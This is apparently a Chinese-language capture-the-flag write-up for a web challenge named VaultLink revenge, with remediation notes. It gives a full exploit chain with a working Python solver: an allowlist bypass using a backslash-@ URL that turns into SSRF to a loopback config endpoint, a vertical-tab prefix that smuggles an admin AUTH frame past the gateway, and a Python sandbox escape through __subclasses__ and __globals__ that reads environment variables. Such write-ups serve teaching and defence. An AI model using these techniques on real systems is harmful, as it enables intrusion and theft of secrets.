# VaultLink revenge

## 1. 题目信息

| 项目 | 内容 |
| --- | --- |
| 分类 | Web |
| 形态 | 容器题 |
| 附件 | 无（容器题） |
| 目标 | 容器 |

Flag：flag{动态容器已脱敏}

目标是在只暴露合作方网关的条件下取得容器中`/flag`对应的旗值。2026-11-01重新下发的实例为`<TARGET_IP>:<TARGET_PORT>`，在其在线期间得到：
```text
flag{...}
```

## 2. 题目分析

### 服务结构与入口

题目只对外暴露一个网关端口，网关后面藏着三样东西：白名单中的合作方主机`rates.partner-forex.example.com`、绑定在`127.0.0.1:31337`的本机维护接口、监听`127.0.0.1:8081/ws`的relay。网关`/docs`给出的合作方正常用法是：

- `GET /api/proxy?url=...`代合作方请求资源，发起前检查目标主机是否在白名单。
- 同一路径在请求带`Upgrade: websocket`时会把连接升级为WebSocket，目标由`url`参数决定。
- relay把每条连接当成一个会话，先发`SESSION`/`READY`问候，要求客户端用`IDENT`绑定，之后才接受业务命令；合作方会话不允许发送管理帧`AUTH`。
- 旧版合作方把凭据放在URL authority中，即`user:pass@host`形式。

由此可知网关是唯一的信任边界：白名单判断、WebSocket目标转发、管理帧过滤都在网关完成，而真正的鉴权和命令执行在relay里。两层各做一半检查，中间的信息差就是本题的入口。

### 干扰线索

首页HTML注释里有一个形如`flag{...}`的字符串，`.git/config`里还留着一个标注为*staging*的`ADMIN_TOKEN`。前者只是页面里的静态内容，后者属于另一套环境的静态口令：relay运行实例既不加载这份配置，也不拿它做校验，`AUTH`需要的是本实例启动时生成的`vault_session_seed`。两处都容易被当成捷径，实际都推不动利用链。

### 可利用缺陷一览

| 层次 | 缺陷 | 效果 |
| --- | --- | --- |
| 网关白名单 | `\@`在两层解析中含义不同 | 绕过白名单，任意内网SSRF |
| relay鉴权 | 前导空白（`\x0b`）处理不一致 | 合作方会话获得admin |
| DIAG表达式 | `[]`可读属性/键并调用返回值 | 反射到`os`模块读环境变量 |

三者缺一不可：只有SSRF才能触达`31337`取到seed，只有seed才能通过`AUTH`，只有admin才有资格调用`DIAG`。

### 白名单的`\@`绕过

白名单判断只关心“主机名是否等于允许的合作方域名”，于是校验器要先在字符串里定位主机名。网关的校验在反斜杠处截断了authority，把`\`之后的内容排除在主机名之外，读到的主机因此是`rates.partner-forex.example.com`，检查通过。真正发起请求的HTTP客户端遵循RFC 3986：它从右往左找`@`，把`@`之前整段当作userinfo，末尾的反斜杠只是一个非法但被容忍的字符，于是实际连接目标是`@`之后的`127.0.0.1:31337`。同一串URL在两个解析器里得到两个主机，白名单与连接目标就此脱钩。`31337`上的`/config`是本机维护接口，没有独立鉴权，直接返回`vault_session_seed`和`relay_endpoint`。

### relay会话能用`0x0b`过闸

relay的命令是行文本：收到一行后先去掉首尾空白，再按空格切词分派。`AUTH`属于管理命令，只允许管理控制台使用；网关会在转发前检查每个数据帧，帧开头是`AUTH`就直接拒绝。问题在于网关的检查针对原始字节，而relay执行前会先做空白归一化。垂直制表符`0x0b`在Python的`str.split()`/`strip()`以及C的`isspace()`里都算空白，却不在网关帧级检查清理的字符集合内。于是`\x0bAUTH admin <seed>`对网关而言不以`AUTH`开头，对relay而言归一化后恰好是`AUTH admin <seed>`。分片、大小写变换、加普通空格都会撞上网关的其他判断，所以只有这个空白字节稳定生效。

### DIAG能反射到`os`

`DIAG <expr>`在表达式求值器里执行维护用算式，只放开了少量函数名，词法层直接拒绝`.`，也不把`open`之类的名字当顶层标识符，所以写不出`open("/flag").read()`或`os.environ`。但方括号下标被实现成“字符串键优先取属性，否则当字典键”，并且下标的结果还能继续调用。这就绕开了点号限制：`1["__class__"]`取到`int`类型，`["__base__"]`到`object`，`["__subclasses__"]()`列出全部已加载子类，其中`subprocess.Popen`带着模块级的`__init__.__globals__`，从中取出`os`，再`["environ"]["get"]("ICQ_FLAG")`。`Popen`在子类列表里的下标随运行时导入顺序变化（该实例为`241`），因此要先用`["__name__"]`比对名称确认下标，再发最终表达式。

### 取值边界

relay进程以`svc`用户运行，而`/flag`属于`root:root`、模式`0400`，只有属主可读，所以同进程打开文件只会得到`Permission denied`，`os.access("/flag", 4)`也返回`False`。旗值改由容器启动时注入的`ICQ_FLAG`环境变量取得；读环境变量是进程读自己的`environ`，不经过文件系统权限检查。`os.stat`显示文件大小43字节，与42字符旗值加一个换行吻合，可作为旁证，但不等于逐字节读到了文件。

### 修复要点

1. URL白名单检查与实际发起连接必须使用同一个规范化解析结果；拒绝含反斜杠、userinfo和控制字符的代理目标，并在连接前重新核对解析后的IP与端口。
2. 不应通过可由合作方网关触达的本机接口返回管理种子；内部服务还应做独立授权。
3. 网关和relay对WebSocket命令应使用一致的解析与规范化规则，管理命令的授权应由relay自身强制执行。
4. `DIAG`不应允许任意对象属性访问与动态调用，尤其应阻止`__class__`、`__globals__`等反射路径；只开放确需的纯计算操作。

## 3. 解题过程

整条链分四步：绕过白名单读`31337`拿seed，用同一手法升级WebSocket连relay，绑定会话后用`0x0b`拿到admin，最后用`DIAG`读环境变量。每步都依赖上一步的产物，顺序不能换。

### 绕过白名单读取维护配置

要访问的目标是网关回环上的维护接口：

```text
http://rates.partner-forex.example.com\@127.0.0.1:31337/config
```

把它整体百分号编码后放进`url`参数，反斜杠编码为`%5C`、`@`编码为`%40`，网关实际收到的请求行是：

```text
GET /api/proxy?url=http%3A%2F%2Frates.partner-forex.example.com%5C%40127.0.0.1%3A31337%2Fconfig HTTP/1.1
Host: <TARGET_IP>
```

必须整体编码，不能让`@`、`:`、`/`裸着出现在查询串里，否则网关可能只截到前半段或把参数拆错。网关解码后做白名单校验，在反斜杠处截断得到`rates.partner-forex.example.com`；建连时按`@`划分userinfo，实际连到`127.0.0.1:31337`。返回：

```json
{
  "service": "vaultlink-gateway",
  "vault_session_seed": "451ec45592a604b2426f47ed9a0840f73ae51ca42bfaa33754f53fbcd73fdd3b",
  "relay_endpoint": "127.0.0.1:8081/ws",
  "note": "internal maintenance endpoint - do not expose"
}
```

`vault_session_seed`是本实例relay的管理种子，`relay_endpoint`指出内部relay地址。种子随实例重新生成，换实例必须重新取，不能复用旧值；`.git/config`里的staging token与此无关。

接着用同样的URL形式把`/api/proxy`升级成WebSocket，`url`参数换成relay地址并整体编码：

```text
ws://<TARGET_IP>:<TARGET_PORT>/api/proxy?url=http%3A%2F%2Frates.partner-forex.example.com%5C%40127.0.0.1%3A8081%2Fws
```

网关对WebSocket目标做同一套白名单校验，所以同样放行；握手成功后，网关照原样在客户端与relay之间转发文本帧。

### 绑定relay会话

WebSocket建立后，relay先发两行问候：

```text
SESSION <16位十六进制随机数>
READY guest
```

`SESSION`后面的随机数（nonce）用来把这条TCP连接和一次会话绑定，防止别的连接顶替。首个数据帧必须是`IDENT <该SESSION随机数>`，relay核对一致后回`OK session-bound`，连接才进入可执行命令的状态。若把`IDENTIFY partner`、`AUTH ...`或`HELP`当首帧发，relay仍停留在未绑定状态，后续指令要么无回执要么报错。nonce每次连接都不同，必须从问候里实时解析，不能写死。绑定后发送`HELP`，会列出：

```text
commands: HELP | BALANCE | AUTH admin <seed> | DIAG <expr>
DIAG evaluates a maintenance expression, e.g. DIAG round(pi * 2)
functions: abs min max round len str int float ord chr
```

这份列表同时给出了管理命令的语法：`AUTH admin <seed>`做管理认证，`DIAG <expr>`在通过认证后求值。

### 绕过管理帧拦截

常规发送`AUTH admin <vault_session_seed>`会收到：

```text
ERR auth-console-only (partner sessions cannot authenticate)
```

这条回执说明帧是被网关按“合作方会话+管理命令”拦下的，与seed是否正确无关。把一个垂直制表符（字节`0x0b`，Python写作`\x0b`）放在命令前：

```python
ws.send("\x0bAUTH admin " + seed)
```

网关的帧检查从第0字节开始比对命令名，`0x0b`让这帧不再以`AUTH`开头，于是被当作普通数据转发；relay收到后先做空白归一化，`0x0b`属于空白，归一化结果正是`AUTH admin <seed>`，于是按管理认证执行，返回：

```text
AUTH-OK admin
```

这里的关键是两层对命令前导空白的处理不一致：网关只看原始字节，relay先`strip`/`split`再分派。普通空格、大小写混合或把命令拆成多帧都不稳定，因为这些形态网关另有判断；`0x0b`刚好落在relay的空白集合里，又不在网关的清理范围内。

### 从DIAG表达式到Python对象

管理员可以调用`DIAG <expr>`。解析器拒绝点号，例如`open("/flag").read()`会报`unexpected character '.'`，也不把`open`等危险名称作为顶层标识符。但`[]`同时能取对象属性、字典键，表达式还可调用取得的对象。

从整数对象沿`__class__`、`__base__`、`__subclasses__`找到`subprocess.Popen`，再通过它的`__init__.__globals__`取得`os`模块。该实例中`Popen`的子类索引为`241`；换Python运行时导入顺序可能变化，所以先核对索引再使用。

完整读取表达式为：

```text
DIAG 1["__class__"]["__base__"]["__subclasses__"]()[241]["__init__"]["__globals__"]["os"]["environ"]["get"]("ICQ_FLAG")
```

逐段拆开：`1["__class__"]`取到`int`类型，`["__base__"]`取到`object`，`["__subclasses__"]()`枚举当前运行时已加载的全部子类，`[241]`选中`subprocess.Popen`，`["__init__"]`取构造函数，`["__globals__"]`拿到该函数所在模块的全局字典，`["os"]`即`os`模块，`["environ"]`是进程环境变量映射，`["get"]("ICQ_FLAG")`读旗值。新实例回执：

```text
RESULT flag{...}
```

由于下标依赖运行时，先用`DIAG 1["__class__"]["__base__"]["__subclasses__"]()[<下标>]["__name__"]`核对，回执为`RESULT Popen`才采用该下标，否则在0到399范围内逐个试，避免版本差异导致整条链失败。

### `/flag`读不到但环境变量可取

同一次`DIAG`里把`environ`换成`stat`、`access`即可验证文件权限：

```text
DIAG 1["__class__"]["__base__"]["__subclasses__"]()[241]["__init__"]["__globals__"]["os"]["stat"]("/flag")
DIAG 1["__class__"]["__base__"]["__subclasses__"]()[241]["__init__"]["__globals__"]["os"]["access"]("/flag", 4)
```

回执：

```text
RESULT os.stat_result(st_mode=33024, st_ino=1310744, st_dev=73, st_nlink=1, st_uid=0, st_gid=0, st_size=43, ...)
RESULT False
```

`st_mode=33024`即`0o100400`，普通文件、权限`0400`；`st_uid=0`、`st_gid=0`说明属主属组都是root。relay进程以`svc`用户运行，既不是root也不在root组，打开文件会被内核拒绝；由同一进程执行`cat /flag`得到`Permission denied`，`os.access("/flag", 4)`（`R_OK`）返回`False`，两者一致。

环境变量则是另一条路径：容器启动时已把旗值写入relay进程的`ICQ_FLAG`，它属于进程自身的内存数据，`os.environ`读取不经过文件系统权限检查，因此能直接返回。`st_size=43`与42字符旗值加一个换行相符，只能说明文件内容很可能就是该旗值，不能据此声称逐字节读取了`/flag`。

## 4. PoC

```python
#!/usr/bin/env python3
"""VaultLink Revenge CTF solver. Python 3 standard library only.

"""

import argparse
import base64
import hashlib
import http.client
import json
import os
import re
import socket
import struct
from urllib.parse import quote


ALLOWLIST_HOST = "rates.partner-forex.example.com"
FLAG_RE = re.compile(r"flag\{[^{}\r\n]+\}")


def proxy_path(url):
    return "/api/proxy?url=" + quote(url, safe="")


def get_config(host, port, timeout):
    target = f"http://{ALLOWLIST_HOST}\\@127.0.0.1:31337/config"
    connection = http.client.HTTPConnection(host, port, timeout=timeout)
    try:
        connection.request("GET", proxy_path(target), headers={"Host": host})
        response = connection.getresponse()
        body = response.read()
        if response.status != 200:
            raise RuntimeError(f"/config: HTTP {response.status}: {body[:200]!r}")
        config = json.loads(body)
        if not config.get("vault_session_seed") or not config.get("relay_endpoint"):
            raise RuntimeError("/config 缺少 seed 或 relay_endpoint")
        return config
    finally:
        connection.close()


class WebSocket:
    def __init__(self, host, port, path, timeout):
        self.sock = socket.create_connection((host, port), timeout=timeout)
        self.sock.settimeout(timeout)
        self.buffer = bytearray()
        key = base64.b64encode(os.urandom(16)).decode("ascii")
        request = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host}:{port}\r\n"
            "Connection: Upgrade\r\n"
            "Upgrade: websocket\r\n"
            "Sec-WebSocket-Version: 13\r\n"
            f"Sec-WebSocket-Key: {key}\r\n"
            "\r\n"
        ).encode("ascii")
        self.sock.sendall(request)
        header = self._read_until(b"\r\n\r\n")
        status = header.split(b"\r\n", 1)[0]
        if b" 101 " not in status:
            raise RuntimeError(f"WebSocket 握手失败: {status!r}")
        expected = base64.b64encode(
            hashlib.sha1((key + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11").encode()).digest()
        )
        if b"sec-websocket-accept: " + expected.lower() not in header.lower():
            raise RuntimeError("WebSocket 握手的 Sec-WebSocket-Accept 不匹配")

    def _read_until(self, marker):
        while marker not in self.buffer:
            data = self.sock.recv(4096)
            if not data:
                raise EOFError("握手期间连接关闭")
            self.buffer.extend(data)
        end = self.buffer.index(marker) + len(marker)
        result = bytes(self.buffer[:end])
        del self.buffer[:end]
        return result

    def _read_exact(self, count):
        while len(self.buffer) < count:
            data = self.sock.recv(max(4096, count - len(self.buffer)))
            if not data:
                raise EOFError("WebSocket 连接关闭")
            self.buffer.extend(data)
        result = bytes(self.buffer[:count])
        del self.buffer[:count]
        return result

    def send_frame(self, opcode, payload):
        mask = os.urandom(4)
        length = len(payload)
        if length < 126:
            header = bytes((0x80 | opcode, 0x80 | length))
        elif length < 65536:
            header = bytes((0x80 | opcode, 0x80 | 126)) + struct.pack("!H", length)
        else:
            header = bytes((0x80 | opcode, 0x80 | 127)) + struct.pack("!Q", length)
        masked = bytes(value ^ mask[index % 4] for index, value in enumerate(payload))
        self.sock.sendall(header + mask + masked)

    def send(self, message):
        self.send_frame(1, message.encode("utf-8"))

    def recv(self):
        fragments = []
        while True:
            first, second = self._read_exact(2)
            opcode = first & 0x0F
            if first & 0x40:
                raise RuntimeError("服务端返回压缩帧；脚本未协商压缩")
            length = second & 0x7F
            if length == 126:
                length = struct.unpack("!H", self._read_exact(2))[0]
            elif length == 127:
                length = struct.unpack("!Q", self._read_exact(8))[0]
            mask = self._read_exact(4) if second & 0x80 else None
            payload = self._read_exact(length)
            if mask:
                payload = bytes(value ^ mask[index % 4] for index, value in enumerate(payload))
            if opcode == 9:
                self.send_frame(10, payload)
                continue
            if opcode == 10:
                continue
            if opcode == 8:
                raise EOFError(f"服务端关闭 WebSocket: {payload!r}")
            if opcode not in (0, 1, 2):
                raise RuntimeError(f"不支持的 WebSocket opcode: {opcode}")
            fragments.append(payload)
            if first & 0x80:
                return b"".join(fragments).decode("utf-8", "replace")

    def close(self):
        try:
            self.send_frame(8, b"")
        except (OSError, EOFError):
            pass
        self.sock.close()


def diag(ws, expression):
    ws.send("DIAG " + expression)
    return ws.recv()


def find_popen_index(ws):
    classes = '1["__class__"]["__base__"]["__subclasses__"]()'
    candidates = [241] + [index for index in range(400) if index != 241]
    for index in candidates:
        if diag(ws, f'{classes}[{index}]["__name__"]') == "RESULT Popen":
            return index
    raise RuntimeError("未找到 subprocess.Popen 类；检查 Python 运行时是否改变")


def solve(host, port, timeout):
    config = get_config(host, port, timeout)
    seed = config["vault_session_seed"]
    relay = f"http://{ALLOWLIST_HOST}\\@{config['relay_endpoint']}"
    ws = WebSocket(host, port, proxy_path(relay), timeout)
    try:
        greeting = ws.recv()
        ready = ws.recv()
        if not greeting.startswith("SESSION ") or not ready.startswith("READY "):
            raise RuntimeError(f"意外的 relay 问候: {greeting!r}, {ready!r}")
        nonce = greeting.split(" ", 1)[1]
        ws.send("IDENT " + nonce)
        ident = ws.recv()
        if ident != "OK session-bound":
            raise RuntimeError(f"会话绑定失败: {ident}")
        ws.send("\x0bAUTH admin " + seed)
        auth = ws.recv()
        if auth != "AUTH-OK admin":
            raise RuntimeError(f"管理认证失败: {auth}")
        print("[+] Relay session bound; admin authenticated")

        index = find_popen_index(ws)
        os_object = (
            f'1["__class__"]["__base__"]["__subclasses__"]()[{index}]'
            '["__init__"]["__globals__"]["os"]'
        )
        result = diag(ws, os_object + '["environ"]["get"]("ICQ_FLAG")')
        match = FLAG_RE.search(result)
        if not match:
            raise RuntimeError(f"未从 ICQ_FLAG 获得 flag: {result}")
        flag = match.group(0)
        print("[+] " + flag)

        stat = diag(ws, os_object + '["stat"]("/flag")')
        readable = diag(ws, os_object + '["access"]("/flag",4)')
        print(f"[i] /flag stat: {stat}")
        print(f"[i] Relay account can read /flag: {readable}")
        print("[i] Flag value came from ICQ_FLAG; /flag was not opened directly")
        return flag
    finally:
        ws.close()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("host", help="题目容器的 IPv4 地址或主机名")
    parser.add_argument("port", type=int, help="题目容器端口")
    parser.add_argument("--timeout", type=float, default=5.0, help="网络超时秒数（默认 5）")
    args = parser.parse_args()
    try:
        solve(args.host, args.port, args.timeout)
    except (OSError, EOFError, TimeoutError, RuntimeError, ValueError, KeyError) as exc:
        parser.exit(1, f"[-] {exc}\n")
```
